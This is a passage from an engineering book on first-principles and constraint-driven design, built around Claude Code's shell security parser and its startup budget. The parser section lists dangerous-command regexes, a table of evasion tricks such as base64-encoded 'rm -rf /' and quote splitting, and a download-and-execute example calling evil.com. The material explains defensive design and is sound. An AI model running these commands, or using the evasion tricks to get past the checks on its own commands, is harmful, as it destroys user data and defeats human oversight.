Applying the Method

To reason from physics in your own system:

  1. List every constraint that cannot be negotiated. Response time requirements, regulatory mandates, hardware limits, user count, team size, deployment model. These are your physics.
  2. For each "best practice" you're tempted to apply, ask: which of my constraints does this address? If none, it is cargo culting. If one, it is justified. If multiple, it is a strong choice.
  3. When the derived answer contradicts convention, trust the derivation. Global mutable state is "bad practice." But for a single-process, single-user CLI agent with deep call stacks, global state derived from constraints is simpler than dependency injection derived from convention. The constraints win.

Case Study: The Shell Parser

Let us now trace the full first principles derivation of Claude Code's shell parser -- a 4,400-line module that is one of the most security-critical components in the system.

The Problem Statement

An AI model generates shell commands. Before executing each command, the system must determine: 1. What programs will be executed 2. With what arguments 3. In what order 4. With what I/O redirections 5. Whether any step is destructive, exfiltrates data, or escalates privileges

This determination must happen before execution, must be resistant to evasion, and must handle the full complexity of bash syntax.

The Naive Approach: Regex

The first instinct is pattern matching. Build a list of dangerous patterns and check each command against them:

const DANGEROUS_PATTERNS = [
  /\brm\s+-rf\s+\//,       // rm -rf /
  /\bDROP\s+TABLE\b/i,      // SQL injection
  /\bcurl\b.*\|\s*sh\b/,    // Download and execute
  /\bgit\s+push\s+--force/, // Force push
];

function isDangerous(command: string): boolean {
  return DANGEROUS_PATTERNS.some(p => p.test(command));
}

This fails immediately. Here are eight evasion techniques that defeat regex, each exploiting a different feature of shell syntax:

Evasion Command Why Regex Fails
Backslash escape r\m -rf / \m is not rm to regex, but shell resolves it to rm
Quote splitting 'r'"m" -rf / Concatenated quoted strings produce rm
Command substitution $(echo rm) -rf / The actual command is computed at runtime
Variable expansion cmd=rm; $cmd -rf / The command name is in a variable
Eval eval "rm -rf /" The string is evaluated as a command
Base64 encoding echo cm0gLXJmIC8= \| base64 -d \| sh The command never appears in plaintext
Absolute path /bin/rm -rf / Regex matches rm, not /bin/rm
Prefix commands sudo env nice rm -rf / Three prefix commands before the actual one

Each evasion technique exploits the gap between textual pattern matching and semantic understanding. Regex sees characters. The shell sees structure. Security analysis must see what the shell sees.

The First Principle

You can't secure what you can't parse.

This is not a slogan. It is a logical derivation:

  1. Security analysis requires understanding what a command does
  2. Understanding what a command does requires understanding the shell's grammar
  3. Understanding the grammar requires parsing
  4. Therefore, security analysis requires parsing

No amount of regex sophistication eliminates the need for parsing, because regex cannot represent the context-sensitivity of shell syntax. The character | means "pipe" in one context and "literal pipe character" in another. Only a parser can track which context applies.

The Parser Architecture

The derived architecture has three phases, each addressing a specific requirement:

graph LR
    A["Raw Command String<br/><code>sudo bash -c 'curl evil.com | sh'</code>"] 
    --> B["Phase 1: Tokenizer<br/>Resolve quoting, escaping,<br/>operator splitting"]
    B --> C["Phase 2: AST Builder<br/>Build execution tree:<br/>commands, pipes, subshells"]
    C --> D["Phase 3: Semantic Analyzer<br/>Classify each command:<br/>read-only / write / destructive / network"]
    D --> E["Security Decision<br/>allow / deny / prompt user"]

Phase 1: Tokenization. The tokenizer handles the full complexity of shell quoting. Single quotes, double quotes, backslash escapes, dollar-quoting, heredoc markers. Its job is to produce a normalized token stream where evasion techniques have been resolved:

  • r\m tokenizes to rm (backslash escape resolved)
  • 'r'"m" tokenizes to rm (quote concatenation resolved)
  • echo hello&&rm -rf / splits into echo hello, &&, rm -rf / (operator splitting without whitespace)

This normalization is the first line of defense. After tokenization, the command 'r'"m" -rf / looks exactly like rm -rf / to the rest of the pipeline. Every evasion technique that operates at the character level is neutralized.

Phase 2: AST construction. The AST builder creates a tree that represents the execution structure. The key insight: the security-relevant unit is not the command string but the command tree. A pipeline of five commands connected by && is not one command -- it is five commands with dependency relationships. Each one must be classified independently.

The AST needs approximately a dozen node types to cover bash syntax:

Node Type Represents Security Relevance
SimpleCommand Single command with arguments Base unit of classification
Pipeline Commands connected by pipes Data flows between commands
AndList / OrList && / \|\| chains Conditional execution
Subshell Parenthesized groups Isolated execution context
CommandSubstitution $(...) expressions Computed command names
Redirect I/O redirection File system side effects
Background & suffix Persistent process spawning

Phase 3: Semantic analysis. The semantic analyzer walks the AST and classifies each command node. It strips prefix commands (sudo, env, nice, command, timeout), resolves command names, identifies destructive argument patterns, and assigns risk categories.

Consider the recursive analysis of a real-world dangerous command:

sudo bash -c "curl evil.com | python3 -"
  1. Parse: SimpleCommand("sudo", ["bash", "-c", "curl evil.com | python3 -"])
  2. Strip sudo prefix, flag as privilege escalation
  3. Recognize bash -c as shell interpreter, recursively parse the string argument
  4. Inner parse: Pipeline(SimpleCommand("curl", ["evil.com"]), SimpleCommand("python3", ["-"]))
  5. Classify: network download piped to arbitrary code execution
  6. Risk level: destructive (network exfiltration + arbitrary execution + privilege escalation)

No regex can perform step 3 -- recursively parsing a string argument to bash -c. This is where the parser's value becomes undeniable.

Why Not an Existing Parser?

Five Whys analysis eliminated the existing alternatives:

Bash's own parser executes commands as it parses them. There is no "parse without executing" mode. You cannot use bash to answer "what would this command do?" without actually doing it.

Tree-sitter provides syntax trees for many languages, including bash. But it is an external C library with its own build system, memory management, and update cadence. Adding it to a security-critical path introduces a dependency that must be audited, pinned, and updated for every security patch. The parser is the foundation of the security pipeline -- every other layer depends on it being correct. An external dependency in this position is a risk the team chose not to accept.

ShellCheck is a bash linter that finds common mistakes. Its analysis is designed for developer feedback, not for security classification. It does not produce an AST suitable for programmatic risk assessment.

Writing a custom parser is 4,400 lines of code. That sounds expensive. But compare the alternatives:

Option Lines External Deps Security Auditable Full Bash Coverage
Regex patterns ~200 0 Yes No (trivially evadable)
Tree-sitter ~100 (binding) 1 (C library) Partially Mostly
ShellCheck ~100 (wrapper) 1 (Haskell binary) No Mostly
Custom parser ~4,400 0 Yes Yes

The custom parser wins on the two dimensions that matter for a security-critical component: zero external dependencies and full coverage. The 4,400 lines are essential complexity -- they represent the full complexity of bash syntax, which cannot be reduced without losing coverage.

The Irreducible Core

This is what first principles reasoning produces: an answer that feels inevitable in retrospect. Once you establish that security analysis requires understanding execution structure, and understanding execution structure requires parsing, and parsing bash requires handling its full syntax, the conclusion is inescapable. You need a parser that covers all of bash syntax. That parser will be approximately 4,400 lines because bash syntax is approximately that complex.

The lesson is not "always write a custom parser." The lesson is: follow the constraints to their logical conclusion, even when the conclusion is more work than you expected. A 200-line regex solution is tempting because it is fast to build. But it fails the first constraint -- resistance to evasion -- and no amount of refinement can fix that, because regex fundamentally cannot parse context-sensitive grammars.

First Principles in System Design

The shell parser is a dramatic example, but first principles reasoning applies to every design decision. Here is a framework for applying it systematically.

Step 1: State the Problem Without a Solution

Most problem statements contain embedded solutions. "We need a microservices architecture" is a solution, not a problem. "We need independent deployment of the authentication service" is closer to a problem, but still assumes services and deployment as concepts.

A first-principles problem statement describes the constraint without prescribing the mechanism:

  • Bad: "We need a caching layer for API responses"
  • Better: "Repeated API calls with identical parameters cost $0.20 each and take 200ms; we need to eliminate that cost and latency for duplicate requests"
  • Best: "Our cost model is dominated by API calls at $0.20/call, with 40% of calls being duplicates. Our latency budget for user-facing responses is 400ms."

The best version contains only constraints -- cost, latency, duplication rate. It does not mention caching, which is a solution. The solution might be caching, or it might be prompt rewriting to reduce duplication, or it might be batching, or it might be a cheaper API tier. First principles reasoning keeps all options open until the constraints eliminate them.

Step 2: Enumerate the Constraints

Constraints come in several categories:

Hard constraints cannot be violated. The speed of light. The network latency between continents. The API's rate limit. The user's expectation of sub-second response time.

Soft constraints can be violated at a cost. File size limits (larger files work but slow down). Memory budgets (exceeding them causes swap, not failure). Code complexity thresholds (complex code works but is harder to maintain).

Assumed constraints feel real but may not be. "We must use PostgreSQL" (because we always have). "The API must be RESTful" (because the last one was). "We need Kubernetes" (because everyone uses it). These are the most dangerous because they feel as solid as hard constraints but evaporate under questioning.

The discipline is to test every constraint: If I remove this constraint, does my problem change? If yes, it is a real constraint. If no, it is an assumption.

Step 3: Derive the Architecture

With a clean problem statement and a verified set of constraints, the architecture often derives itself. Each constraint eliminates options until the solution space is small.

Claude Code's global state decision is a textbook example:

Constraint Effect on Design
Single process, single user No concurrency -- DI's isolation benefit does not apply
15+ deep call stacks DI requires context parameter in every function signature
Cross-cutting telemetry "Singleton-scoped DI" is just global state with abstraction overhead
400ms startup budget DI containers add initialization time

Four constraints, four points against dependency injection, zero points for it. The derivation produces global mutable state -- a "bad practice" that is correct for these specific constraints.

Step 4: Verify Against Convention

After deriving an answer, compare it to conventional wisdom. If they agree, great. If they disagree, you have found one of two things:

  1. A genuine insight -- your constraints differ from the constraints that produced the convention. Document why.
  2. A mistake in your reasoning -- you missed a constraint or mischaracterized one. Go back to Step 2.

The team documented their global state decision with three escalating warnings in the source code: "DO NOT ADD MORE STATE HERE -- BE JUDICIOUS WITH GLOBAL STATE," "THINK THRICE BEFORE MODIFYING," "AND ESPECIALLY HERE." These warnings acknowledge the convention while defending the derivation. They communicate to future engineers: yes, we know this looks wrong. Here is why it is right for this system. Think before you "fix" it.

Common Traps

First principles reasoning has its own failure modes. Being aware of them makes the technique more reliable.

Trap 1: Premature Reduction

Stripping too many layers too fast. "Why do we need authentication? Because users need access control. Why do users need access control? Because we have multiple users. Do we have multiple users? No, we have one user. Therefore, we don't need authentication."

The error is skipping a constraint: even a single-user system may need authentication to prevent unauthorized access from other processes, network attackers, or untrusted code. First principles reasoning requires patience -- each reduction step must be verified against all constraints, not just the most obvious one.

Trap 2: False Irreducibility

Declaring something a "first principle" when it is actually an assumption. "JavaScript is single-threaded" is a first principle of the V8 runtime. "We must use JavaScript" is an assumption. If you derive architecture from the assumption that JavaScript is a given, you may miss designs that would be better in a different runtime.

Claude Code chose Bun over Node.js partly for its compile-time feature flag system via bun:bundle. If they had treated "Node.js" as a first principle rather than an assumption, they would have missed this option.

Trap 3: Analysis Paralysis

First principles reasoning can be recursive -- every constraint can be questioned further. At some point, you must accept a constraint and move forward. The practical heuristic: stop reducing when you reach a constraint that is outside your control. The speed of light, the API's pricing model, the user's perceptual latency threshold -- these are not your constraints to change. Build from them.

Trap 4: Ignoring Implementation Cost

First principles may derive the "correct" solution, but the correct solution may be prohibitively expensive to implement. A 4,400-line custom parser is justified for a security-critical component in a 500K-line system. The same parser would be absurd in a weekend hackathon project.

The resolution: first principles tell you the ceiling of what is correct. Pragmatism tells you the floor of what is sufficient. If your system is low-risk and short-lived, regex may be sufficient even though a parser is correct. If your system is security-critical and long-lived, nothing less than a parser will do.

The Engineer's First Principles Toolkit

Three mental tools for first principles reasoning, refined through practice:

Tool 1: The Constraint Inversion Test

For every design choice, ask: "What would have to be true for the opposite choice to be correct?" If you chose a monolith, what constraints would need to change for microservices to be the right answer? (Multiple teams deploying independently. Different scaling requirements per component. Different technology stacks.) If those constraints exist, reconsider your choice. If they don't, your derivation is sound.

Tool 2: The Physics Test

For every constraint, ask: "Is this a law of physics or a law of convention?" Laws of physics cannot be worked around. Laws of convention can be changed. The speed of light is physics. "All APIs must be REST" is convention. "Users expect sub-second response times" is physics (it derives from the nervous system). "We must use JSON for API responses" is convention.

Tool 3: The Reductio Test

Take your solution and assume it is wrong. What breaks? If you assume the shell parser is unnecessary and use regex instead, what breaks? Answer: the first attacker who uses backslash escaping bypasses your security. If you assume global state is wrong and use DI instead, what breaks? Answer: nothing breaks, but you add 1,300 lines of context-passing boilerplate. The severity of what breaks tells you how strong your derivation is.

Key Principles

  1. Analogy is not evidence. Netflix's architecture solves Netflix's constraints. Your architecture must solve yours.
  2. Identify your physics. Every problem has immovable constraints -- human perception, security asymmetry, essential complexity, cost models. Find them before designing.
  3. The Five Whys eliminate alternatives. Keep asking "why not?" until only one answer remains.
  4. You can't secure what you can't parse. Any security analysis of structured input requires understanding the input's grammar. Regex is not understanding.
  5. When derivation contradicts convention, document why. Future engineers need to see the reasoning, not just the result.
  6. The correct solution may be more work than expected. First principles don't care about your timeline. They care about what must be true.

Think About It

Exercise 1: Invert Your Last Decision. Pick a recent architectural decision you made. Apply the Constraint Inversion Test: what would have to be true for the opposite choice to be correct? How many of those conditions actually apply? Did you choose by derivation or by convention?

Exercise 2: Find the Physics. Take a system you work on. List every constraint you can think of. Now classify each as physics (immovable) or convention (negotiable). How many "physics" constraints survive scrutiny? Which "conventions" are you treating as physics?

Exercise 3: Five Whys on Your Security Model. Pick a security mechanism in your system (authentication, authorization, input validation, encryption). Apply the Five Whys. Does the mechanism derive from the actual threat model, or from the convention of "we should have security"? What specific attacks does it prevent? What attacks does it miss?

Exercise 4: The Parser Question. Your system processes user input in some structured format -- SQL queries, URLs, file paths, configuration files, command-line arguments. Are you parsing that input or pattern-matching it? If pattern-matching, construct three evasion techniques that bypass your patterns. How hard was that? What does that tell you about your security posture?

Exercise 5: Essential vs. Accidental. Find the largest file in your codebase. Is its size essential (the problem is inherently that complex) or accidental (poor factoring, unnecessary abstractions, dead code)? Apply the heuristic from this chapter: can you draw a line through the file such that code above never calls code below? If yes, split there. If no, the size may be justified.

Chapter 4: Thinking in Constraints

The Paradox of Constraint

The most creative engineering happens under the tightest constraints. This sounds backward -- shouldn't more freedom produce better designs? -- but the history of engineering tells a different story. The sonnet, with its rigid 14-line, iambic pentameter structure, produced Shakespeare's greatest poetry. The 140-character limit of early Twitter created a new form of communication. The 640KB memory limit of the original IBM PC drove an entire generation of optimization techniques that are still taught today.

In engineering, constraints are not obstacles. They are design tools. Every constraint you accept eliminates a universe of mediocre solutions and forces you toward the few that actually work. The engineer who says "I can't work with these constraints" is revealing a poverty of imagination. The engineer who says "these constraints shaped a design I never would have found otherwise" is telling the truth about how good engineering actually works.

This chapter explores thinking in constraints -- the discipline of identifying, embracing, and leveraging the limitations that shape every system. The case study is Claude Code's 400ms startup budget: a single constraint that influenced the initialization architecture, the module loading strategy, the configuration system, the authentication flow, and the UI rendering pipeline. One number. Dozens of architectural consequences.

The Taxonomy of Constraints

Not all constraints are created equal. Understanding the different types changes how you work with them.

Hard Constraints: The Non-Negotiable

Hard constraints cannot be violated without catastrophic failure. They are the walls of the design space.

  • Physical limits. The speed of light sets the minimum latency between continents. No architecture can work around it. A user in Tokyo and a server in Virginia have at least 70ms of round-trip latency, and you cannot engineer your way to zero.
  • Resource limits. A model's context window is 200K tokens. Your system prompt is 70K tokens. That leaves 130K for conversation history. This is arithmetic, not a suggestion.
  • Safety limits. An AI agent must not execute rm -rf /. There is no "acceptable failure rate" for destroying a user's filesystem. The constraint is absolute.

Hard constraints are valuable because they eliminate options decisively. If your context window is 200K tokens, you do not need to evaluate architectures that require 500K tokens. The constraint did your decision-making for you.

Soft Constraints: The Negotiable

Soft constraints have costs for violation rather than catastrophic failure. They are the slopes of the design space, not the walls.

  • Performance budgets. "Startup should take less than 400ms" is a soft constraint. A 500ms startup does not crash the system -- it degrades the user experience. But the degradation is measurable and the team chose 400ms after reasoning about human perception thresholds.
  • Complexity budgets. "Files should be under 500 lines" is a soft constraint. A 5,000-line file works just fine. But it is harder to maintain, harder to review, and harder to onboard new engineers to. The cost of violation is real but distributed over time.
  • Backwards compatibility. "New versions must read old session files" is a soft constraint. Breaking compatibility is possible -- but it destroys user trust and generates support load.

The art with soft constraints is setting them precisely. Too tight and you cannot solve the problem. Too loose and they do not constrain the design space enough to be useful.

Self-Imposed Constraints: The Strategic

The most interesting constraints are the ones you choose. They do not come from physics or requirements -- they come from engineering judgment about what produces better designs.

  • "No external dependencies in the security pipeline." Claude Code's shell parser has zero external dependencies. This is not a hard constraint -- tree-sitter would work. It is a strategic constraint that eliminates an entire category of supply chain risk for the most security-critical component.
  • "The state module must be a leaf of the import DAG." Claude Code's bootstrap/state.ts cannot import from any other application module. This is enforced by an ESLint rule. The constraint prevents circular dependencies and ensures state is available to every module without import order issues.
  • "Tools must follow a uniform contract." Every tool -- all 52 of them -- accepts a typed input, executes an action, and returns a typed result. No side channels, no hidden state. This constraint enables the LLM to predict tool behavior from the schema alone.

Self-imposed constraints are the signature of experienced engineering. They sacrifice local convenience for global coherence. Any individual tool could be more capable with side channels and hidden state. But the system as a whole is more reliable because every tool follows the same contract.

Case Study: The 400ms Startup Budget

In early 2025, Claude Code's startup took roughly 1.2 seconds. Users complained. The team set a constraint: startup must complete in 400 milliseconds or less. Not "startup should be fast." Not "optimize startup time." A specific, measurable, non-negotiable number.

That single constraint produced an entire initialization architecture that would not have existed without it.

Why 400ms?

The number derives from the physics of human perception (as discussed in Chapter 3):

Delay Perception User Behavior
< 100ms Instantaneous No awareness of delay
100-400ms Fast, responsive Comfortable, no friction
400ms-1s Noticeable delay Acceptable for a complex tool
1-2s Slow User wonders if something is wrong
> 2s Painful User considers Ctrl+C

CLI tools compete directly with git, ls, npm, and other tools that respond in milliseconds. An AI agent that takes 3 seconds to show a cursor is fighting for attention against tools that take 50ms. Over a day of heavy use -- launching the tool dozens of times -- even small delays compound into resentment.

The team chose 400ms because it is the upper bound of "fast." Not instantaneous (which would require < 100ms, impossible for a JavaScript application that loads a React-based UI), but fast enough that users never think about the delay.

The Budget Spreadsheet

Once you have a budget, you need to allocate it. This is where constraint-driven thinking produces its most visible results. Every millisecond must be accounted for:

pie title Startup Budget Allocation (390ms total)
    "Module Evaluation (JS parsing)" : 135
    "REPL First Paint (Ink/Yoga)" : 165
    "Settings + Authentication" : 20
    "Feature Flags (GrowthBook CDN)" : 50
    "Session + Telemetry" : 15
    "Entry Point + CLI Parsing" : 5

Two phases dominate: module evaluation (135ms) and REPL first paint (165ms). Together they consume 77% of the budget. These are floor costs -- the minimum time required by the JavaScript runtime to parse the application code and by the Ink rendering framework to perform its first layout pass. They cannot be reduced through better engineering; they can only be reduced by switching runtimes or frameworks (which introduces other costs).

The remaining 90ms must accommodate settings resolution, authentication, feature flags, session initialization, and telemetry. That is 90ms for five distinct subsystems. The constraint is tight enough that every subsystem must justify its allocation.

Architectural Consequence 1: The Entry Point as Router

The tightest allocation is the entry point: 5ms. In 5ms, the system must read process.argv, determine which execution path to take, and begin importing only the necessary modules.

This constraint produces a specific architectural pattern: the entry point is a router, not an initializer. It does not load the application framework. It does not initialize logging. It does not read configuration files. It reads just enough of the command-line arguments to determine which path to take:

// Pseudocode: the entry point's only job
const args = process.argv.slice(2);

if (args.includes('--version')) {
  console.log(VERSION);  // 5ms total
  process.exit(0);
}

if (args[0] === 'mcp' && args[1] === 'serve') {
  await import('./mcp-server.js');  // 80ms path
} else {
  await import('./main.js');  // 390ms path
}

This pattern has a concrete cost: the entry point cannot use any framework features. No logging, no configuration, no telemetry. It is raw process.argv parsing and conditional import() statements. But the benefit is enormous: claude --version completes in 5ms, claude mcp serve loads only the MCP server modules (80ms), and only the interactive REPL pays the full 390ms cost.

Without the 400ms constraint, a developer would naturally write import { everything } from './app' at the top of the entry point. That single import would add 135ms to every invocation, including --version. The constraint prevented this -- it made the expensive import path visible and forced the team to gate it behind a conditional.

Invocation What Loads Time
claude --version Nothing ~5ms
claude mcp serve MCP server module only ~80ms
claude -p "prompt" Main app minus REPL ~225ms
claude (interactive) Full pipeline ~390ms

Architectural Consequence 2: Parallel I/O During Module Load

Module evaluation -- the 135ms that the JavaScript runtime spends parsing the application code -- is a synchronous, single-threaded operation. Nothing can make it faster. But it is dead time: while the main thread parses JavaScript, the CPU is busy but the I/O subsystem is idle.

The constraint forced the team to ask: What I/O operations will we need after module evaluation? Can we start them during module evaluation?

The answer: yes. Three operations can be prefetched:

  1. MDM settings (macOS device management configuration): a plutil subprocess that takes ~20ms
  2. OAuth keychain credentials: a security find-generic-password subprocess that takes ~30ms
  3. API preconnection: a TCP + TLS handshake that takes ~150ms

These are fire-and-forget: spawn the subprocess, store the promise, continue with module evaluation. When the results are needed 135ms later, the promises are already resolved.

gantt
    title Parallel I/O During Module Load
    dateFormat X
    axisFormat %Lms

    section I/O (async)
    MDM subprocess           :active, mdm, 0, 20
    Keychain prefetch         :active, kc, 0, 30

    section Synchronous
    Entry point routing       :crit, entry, 0, 2
    Module evaluation         :crit, eval, 2, 137
    CLI parsing               :crit, parse, 137, 140
    Rendezvous (await)        :crit, rv, 140, 141

    section Savings
    MDM result ready          :milestone, m1, 20, 20
    Keychain result ready     :milestone, m2, 30, 30

The rendezvous point -- where the async results are collected -- is placed at the latest possible moment: after CLI parsing, in a Commander.js preAction hook. By this point, the prefetched operations have had 140ms to complete. They only needed 30ms. The await resolves in under 1ms.

This pattern -- speculative prefetch with late rendezvous -- saves 65ms per startup. Without the 400ms constraint, no one would have written this code. Why would you? Prefetching adds complexity, introduces failure modes (what if the subprocess crashes?), and requires careful coordination. The benefit is invisible to the user -- they cannot tell the difference between 390ms and 455ms. But the budget demanded it, and the budget was set by the physics of human perception. The constraint cascades: perception physics produces 400ms budget, budget reveals 65ms gap, gap motivates prefetch, prefetch requires rendezvous pattern.

Architectural Consequence 3: Deferred Everything

The 400ms constraint is not just about what happens during startup. It is equally about what does not happen during startup. Every operation that can be deferred until after the cursor blinks is deferred:

Operation Time Required When It Actually Runs
MCP server subprocess startup 200-500ms each First MCP tool invocation
Git repository indexing 50-500ms First file context query
Full schema validation ~10ms Lazy, after first settings access
LSP server connection 500ms-2s First code intelligence query
Remote managed settings Network-dependent Background, non-blocking
Analytics module initialization ~50ms Fire-and-forget during init

Each deferral is a design decision with trade-offs. Deferring MCP server startup means the first MCP tool invocation is slower. Deferring git indexing means the first file context query is slower. The team accepted these per-operation latency penalties because they occur once per session, while the startup penalty would occur every time the user launches the tool.

This is the power of a hard budget: it forces explicit prioritization. Without the constraint, each of these operations would "obviously" belong in startup -- they make the system "ready" faster. With the constraint, each must justify its milliseconds against all the others. Most cannot.

Architectural Consequence 4: Early Input Capture

Between launching the binary and the REPL rendering its first frame, approximately 300ms pass. During this window, the terminal is accepting input but no component is listening. Fast typists who begin typing immediately lose their first keystrokes.

The 400ms constraint did not create this problem -- any application with a noticeable startup delay has it. But the constraint made the problem visible and motivated the solution: an early input capture system that buffers keystrokes during module loading and replays them when the REPL mounts.

// Simplified: capture starts before module import
function startCapturingEarlyInput(): void {
  const buffer: Buffer[] = [];
  process.stdin.setRawMode?.(true);
  process.stdin.resume();
  process.stdin.on('data', (chunk: Buffer) => buffer.push(chunk));

  // Exposed for the REPL to consume
  earlyInputReplay = () => {
    process.stdin.removeListener('data', onData);
    return Buffer.concat(buffer);
  };
}

This is a small feature -- maybe 30 lines of code. But it has outsized impact on perceived quality. Without it, the tool feels broken for fast typists. With it, the tool feels like it was ready the instant they pressed Enter, even though 300ms of initialization happened in between.

The insight: constraints don't just improve performance. They force you to notice problems you would otherwise ignore. Without a tight budget, the 300ms input gap would have been invisible -- "the tool is still loading, of course it doesn't accept input yet." The budget made every millisecond visible, and the input gap became a bug rather than a feature.

Architectural Consequence 5: Failure Resilience

Every network operation in the startup path has an explicit timeout:

Operation Timeout What Happens on Failure
GrowthBook feature flags 2,000ms Use coded defaults
MCP registry prefetch 3,000ms No registry autocomplete
Remote managed settings 5,000ms Use cached/local settings
API preconnect None First API call does its own connect

The GrowthBook timeout is instructive. Feature flags are fetched from a CDN. Most fetches complete in under 50ms. The 2-second timeout is generous enough to handle slow networks but strict enough to stay within the budget.

But the constraint has a deeper consequence: every runtime flag must have a safe default. If the CDN is unreachable, the system uses the coded default for every flag. This means the team must maintain two definitions for each flag: the dynamic value from GrowthBook and a hardcoded default in the source code. The defaults must be production-safe -- if all flags fell back to defaults simultaneously (CDN outage), the system must still function correctly.

The 400ms budget created this discipline. Without it, the team might have allowed a 10-second timeout for flag fetching, treating it as a "startup cost." The tight budget forced a fail-fast design that is more resilient to network problems, not just faster.

How Constraints Breed Creativity

The startup case study illustrates a general principle: constraints eliminate easy solutions and force creative ones. Let's examine why this happens and how to exploit it.

The Solution Space Funnel

Without constraints, the solution space for any engineering problem is enormous. "Build a CLI tool" admits millions of valid designs. Each constraint narrows the funnel:

graph TD
    A["Unconstrained: Build a CLI tool<br/>(millions of valid designs)"] --> B
    B["+ Must start in 400ms<br/>(eliminates daemon architectures,<br/>heavy frameworks, eager initialization)"] --> C
    C["+ Single binary deployment<br/>(eliminates microservices,<br/>plugin hosts, dynamic loading)"] --> D
    D["+ Zero-external-dependency security<br/>(eliminates tree-sitter, shellcheck<br/>in the parser pipeline)"] --> E
    E["+ 200K token context window<br/>(eliminates naive conversation history,<br/>forces compaction architecture)"] --> F
    F["Highly constrained:<br/>~3 viable designs remaining"]

    style A fill:#533483,stroke:#e94560,color:#fff
    style F fill:#16213e,stroke:#0f3460,color:#fff

Each constraint eliminates entire categories of solutions. By the time you have five or six real constraints, the solution space is small enough that the "right" design becomes apparent. You did not find it through creativity -- you found it through elimination.

This is why experienced engineers often say that the hardest part of engineering is defining the problem (Chapter 2) and identifying the constraints. Once those are done, the solution is frequently obvious.

Constraints as Communication

Constraints also serve as communication tools within engineering teams. "Make startup fast" is vague. "Startup must complete in 400ms, with this budget allocation" is precise. Every engineer on the team can independently evaluate whether their code fits within the budget. No coordination meetings needed. No "what do you mean by fast?" debates. The constraint speaks for itself.

Claude Code's startup profiling system embeds this communication directly into the codebase. Profiling checkpoints are placed at decision boundaries, and every checkpoint reports its time contribution:

[+  0.000ms] cli_entry
[+  2.340ms] cli_before_main_import
[+137.892ms] cli_after_main_import        (+135.552ms)
[+389.221ms] main_after_run               (+251.329ms)

When a new engineer adds a top-level import that increases cli_after_main_import by 20ms, the profiling output makes it visible immediately. The constraint enforces itself through measurement. This is more reliable than code review -- the number does not lie, and it does not require a senior engineer to remember the rule.

The "Impossible" Constraint

Sometimes a constraint seems impossible. When Claude Code set the 400ms budget, the startup was 1.2 seconds. Removing 800ms from a critical path sounds impossible. But the constraint forced the team to question every assumption:

  • Must we initialize MCP servers at startup? No -- defer to first use.
  • Must we load all modules eagerly? No -- dynamic imports behind conditionals.
  • Must we wait for keychain reads before proceeding? No -- prefetch and rendezvous.
  • Must we validate all settings at startup? No -- validate critical fields, defer the rest.

Each question revealed an assumption that had been invisible before the constraint made it visible. The 1.2-second startup was not the result of 1.2 seconds of essential work. It was the result of 390ms of essential work plus 810ms of work that had drifted into startup because nobody had a reason to question it.

This is the deepest lesson of constraint-driven thinking: the impossible constraint is often a measurement failure, not an engineering failure. The work that must happen in the critical path is usually much less than the work that currently happens in the critical path. The constraint forces the distinction.

Types of Constraints That Shape Systems

Beyond startup time, several categories of constraints produce powerful design effects.

Safety Constraints

"The Bash tool must not execute destructive commands without user confirmation."

This constraint produced a six-stage security pipeline: parse, classify, pattern check, permission evaluation, AI classification, and sandbox execution. Each stage exists because the constraint demanded certainty, and no single stage provides it.

The compound effect of multiple safety constraints is particularly powerful. Claude Code's Bash tool is constrained by:

  1. Must handle the full complexity of bash syntax (drives the parser)
  2. Must be resistant to evasion techniques (drives recursive analysis)
  3. Must not depend on external tools for security decisions (drives zero-dependency parser)
  4. Must fail closed when uncertain (drives the user-prompt fallback)
  5. Must limit blast radius when all checks are bypassed (drives OS-level sandboxing)

Five constraints, nine decision points, defense in depth. Each constraint alone might admit a simpler solution. Together, they derive the full architecture.

Backwards Compatibility Constraints

"New versions must read old session files. Old session files use JSONL format."

This constraint means the session persistence layer cannot switch to SQLite, binary formats, or any format that breaks JSONL compatibility. It shapes the session architecture: append-only writes, line-oriented recovery, no schema migrations.

Backwards compatibility is a constraint that compounds over time. Each release adds more guarantees that future releases must honor. The implication: be very careful about what you guarantee. Every format, protocol, and API you expose becomes a constraint on all future development.

Trust Constraints

"Project-level settings must not execute before the user accepts the trust dialog."

This constraint determines the ordering of the initialization pipeline. Settings from a .claude/settings.json in an untrusted repository could contain malicious environment variable overrides (e.g., LD_PRELOAD, NODE_OPTIONS, PATH manipulation). The trust dialog must run after authentication (so it can display the user's identity) but before project settings are loaded (so untrusted settings cannot execute).

The ordering constraint cascades through the entire initialization sequence:

graph LR
    A["Phase 1-3:<br/>Prefetch I/O"] --> B["Phase 5:<br/>CLI Parsing"]
    B --> C["Phase 6:<br/>User Settings<br/>(safe)"]
    C --> D["Phase 7:<br/>Authentication"]
    D --> E["Phase 9:<br/>Trust Dialog"]
    E --> F["Phase 10+:<br/>Project Settings<br/>(now trusted)"]

    style E fill:#e94560,stroke:#1a1a2e,color:#fff

The security constraint on Phase 6 is subtle: applySafeConfigEnvironmentVariables() reads environment variables exclusively from ~/.claude/settings.json -- the user's own settings file. It deliberately excludes project settings. This is a trust boundary implemented through data source restriction: only the user's own configuration can modify the process environment before the trust dialog.

Without the trust constraint, the initialization order would be simpler: load all settings, then proceed. The constraint added a phase (the trust dialog) and a restriction (project settings deferred). The architecture is more complex, but the complexity is essential -- it protects against a real attack vector.

Cost Constraints

"A prompt cache miss costs 7x a cache hit."

This constraint shaped Claude Code's header management, state mutation strategy, and context compaction architecture:

Header stability. The API client sends 17 beta headers that are part of the server-side cache key. Adding, removing, or changing any header busts the cache. The architecture treats header composition as a cache-key-management problem: headers are computed once per session and frozen.

Cache latching. Five boolean fields in global state use a "sticky-on" pattern: once set to true, they never revert to false. When the user toggles fast mode on and then off, the header stays true (keeping the cache key stable) while the behavior parameter changes. This separation between cache key stability and behavioral flexibility is a direct consequence of the cost constraint.

Context compaction. The 5-tier compaction system preserves the beginning of the conversation (where the system prompt lives and where the cache is warmest) and removes content from the middle and end. Most compaction systems use FIFO -- remove oldest first. But FIFO would remove the cached system prompt prefix, causing a cache miss on every compacted turn. The cost constraint inverted the conventional compaction strategy.

Constraint-Driven Design Method

Here is a practical method for using constraints as design tools.

Step 1: Enumerate All Constraints

Gather constraints from every source:

  • Product requirements. Response time, availability, compatibility, supported platforms.
  • Technical limits. Context windows, memory budgets, API rate limits, binary size limits.
  • Security requirements. Authentication, authorization, data protection, sandboxing.
  • Organizational realities. Team size, deployment cadence, support capacity.
  • Economic models. API costs per call, infrastructure costs per user, cost of a cache miss.
  • User expectations. Startup time, response latency, error recovery, data persistence.

Do not filter. Include every constraint you can identify, even ones that seem trivial. Trivial constraints sometimes produce important design consequences.

Step 2: Classify and Prioritize

